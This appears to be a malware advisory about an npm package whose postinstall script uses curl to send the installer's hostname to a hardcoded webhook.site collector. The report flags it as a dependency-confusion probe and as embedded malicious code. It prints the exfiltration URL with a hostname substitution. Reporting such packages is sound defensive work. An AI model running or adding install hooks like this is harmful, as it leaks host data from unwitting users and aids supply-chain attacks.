summary: postinstall exfiltrates installer hostname to webhook.site collector
details: package.json declares a postinstall lifecycle script that runs `curl` on `npm install`, sending the installer's hostname as a query parameter to a hardcoded webhook.site collector URL (https://webhook.site/74ed1be3-96d6-48c3-932b-6b1dbabaff97?pkg=medisend-webview-bridge-$(hostname)). The User-Agent is set to `curl/dep-confusion-test`. The version label `0.0.1-security-research` and the package name suggest a dependency-confusion probe against an internal `@medisend/*` scope, but the code performs unconsented exfiltration of installer host identity to a third-party collector at install time regardless of stated intent.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
